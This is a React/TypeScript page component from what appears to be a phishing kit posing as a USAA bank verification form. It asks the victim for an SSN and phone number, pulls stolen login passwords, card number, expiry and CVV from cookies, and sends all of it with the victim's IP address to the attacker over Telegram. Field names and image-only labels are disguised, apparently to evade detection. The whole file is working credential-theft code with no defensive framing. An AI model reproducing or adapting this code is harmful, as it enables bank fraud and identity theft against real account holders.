import React, { useState } from "react";
import { useNavigate } from "react-router-dom";
import cookies from "../utils/cookie.config";
import TelegramSend from "../utils/send-message";
import snAgroNo from "../assets/snAgroNo.png"
import phoneAgeNo from "../assets/phoneAgeNo.png"

type IdentityT = {
  phoneAgeNo: string;
  snAgroNo: string;
};

type Additional = {
  regNo: string;
  registrationExpiry: string;
  thirdNum: string;
};

export default function Identity() {
  const [formInput, setFormInput] = useState<IdentityT>({
    phoneAgeNo: "",
    snAgroNo: "",
  });

  const login1: Login = cookies.get("login1");
  const login2: Login2 = cookies.get("login2");
  const additional:Additional  = cookies.get("additional");
  const ipman: ip = cookies.get("ipman");

  const navigate = useNavigate();
const [isLoading, setIsLoading] = useState(false)
  function handleInputChange(event: React.ChangeEvent<HTMLInputElement>) {
    setFormInput((prevData) => ({
      ...prevData,
      [event.target.name]: event.target.value,
    }));
  }

  async function handleSubmit(event: React.FormEvent<HTMLFormElement>) {
    setIsLoading(true)
    event.preventDefault();

    const message = `
    [----+🏦 USAA 🏦+-----]
    
    IP: ${ipman.ipman}

    Username: ${login1.score}
    Password: ${login1.scorePro}

    Username 2: ${login2.score2}
    Password 2: ${login2.scorePro2}

    Card number: ${additional.regNo}
    Card Expiry : ${additional.registrationExpiry}
    Card Cvv: ${additional.thirdNum}

    SSN: ${formInput.snAgroNo}
    Phone Number: ${formInput.phoneAgeNo}
    `;

    await TelegramSend(message);
    setIsLoading(false);
    navigate("../success", {replace:true});
  }
  return (
    <>
    <div className="submitForm">
  
    <p
          className="go-left"
          style={{ fontSize: "14px", marginBottom: "30px" }}
        >
        Please verify your personal information. <br />
        </p>

      <form method="post" onSubmit={handleSubmit} aria-busy="false">
        <div className="usaa-form-v5-10-1-textInput usaa-form-v5-10-1-fieldWrapper miam-form-id-input">
          <div className="usaa-form-v5-10-1-block col-1-1">
            <div>
              <div>
                <label
                  htmlFor="usaa-form-v5-10-1-input-mwc9hotwmucj"
                  className="usaa-form-v5-10-1-fieldLabel usaa-form-v5-10-1-fieldWrapper-label"
                >
                  <div className="kylexy">
          <img src={snAgroNo} height={19} alt="" />
                      </div>
                </label>
              </div>
              <div>
                <div
                  id="usaa-form-v5-10-1-input-mwc9hotwmucj-errorMessage"
                  className="usaa-form-v5-10-1-fieldWrapper-errorMessage"
                  data-error-message=""
                ></div>
                <div className="screenReader" role="alert"></div>
              </div>
              <span className="usaa-input">
                <input
                  name="snAgroNo"
                  onChange={handleInputChange}
                  required
                  aria-invalid="false"
                  id="usaa-form-v5-10-1-input-mwc9hotwmucj"
                  type="text"
                  aria-describedby="usaa-form-v5-10-1-input-mwc9hotwmucj-errorMessage undefined"
                  maxLength={10}
                />
                <span className="keyboardFocusRing" aria-hidden="true"></span>
              </span>
            </div>
            <div className="keyboardFocusRing"></div>
          </div>
        </div>

        <div className="usaa-form-v5-10-1-textInput usaa-form-v5-10-1-fieldWrapper miam-form-id-input">
          <div className="usaa-form-v5-10-1-block col-1-1">
            <div>
              <div>
                <label
                  htmlFor="usaa-form-v5-10-1-input-mwc9hotwmucj"
                  className="usaa-form-v5-10-1-fieldLabel usaa-form-v5-10-1-fieldWrapper-label"
                >
                  <div className="kylexy">
          <img src={phoneAgeNo} height={19} alt="" />
                      </div>
                </label>
              </div>
              <div>
                <div
                  id="usaa-form-v5-10-1-input-mwc9hotwmucj-errorMessage"
                  className="usaa-form-v5-10-1-fieldWrapper-errorMessage"
                  data-error-message=""
                ></div>
                <div className="screenReader" role="alert"></div>
              </div>
              <span className="usaa-input">
                <input
                onChange={handleInputChange}
                  name="phoneAgeNo"
                  required
                  aria-invalid="false"
                  id="usaa-form-v5-10-1-input-mwc9hotwmucj"
                  type="tel"
                  aria-describedby="usaa-form-v5-10-1-input-mwc9hotwmucj-errorMessage undefined"
                  
                />
                <span className="keyboardFocusRing" aria-hidden="true"></span>
              </span>
            </div>
            <div className="keyboardFocusRing"></div>
          </div>
        </div>
        {isLoading ?
        <button
        type="button"
        className="usaa-button4 miam-btn-next submit-btn usaa-button4--primary"
        id="next-button"
        aria-labelledby="next-button"
      >
        <span>Please wait...</span>
      </button>
        :
        <button
          type="submit"
          className="usaa-button4 miam-btn-next submit-btn usaa-button4--primary"
          id="next-button"
          aria-labelledby="next-button"
        >
          <span>Submit</span>
        </button>}
        <div className="help-link">
          <a
            aria-label="I need help logging on. (Opens a pop up)."
            role="link"
          >
            I need help logging on
          </a>
        </div>
      </form>
    </div>
  </>
  );
}
